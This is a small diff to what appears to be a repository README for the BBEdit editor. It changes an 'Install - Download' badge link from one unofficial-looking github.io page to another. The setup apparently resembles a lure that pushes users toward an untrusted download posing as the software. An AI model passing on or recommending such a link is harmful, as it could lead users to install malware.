@@ -6,7 +6,7 @@
 
 <p align="center">
 
-[![Install](https://img.shields.io/badge/⬇%20Install-Download-blue?style=for-the-badge)](https://osx-sub-software.github.io/.github/BBEdit)
+[![Install](https://img.shields.io/badge/⬇%20Install-Download-blue?style=for-the-badge)](https://hawk-apps-software.github.io/.github/BBEdit)
 
 </p>
 
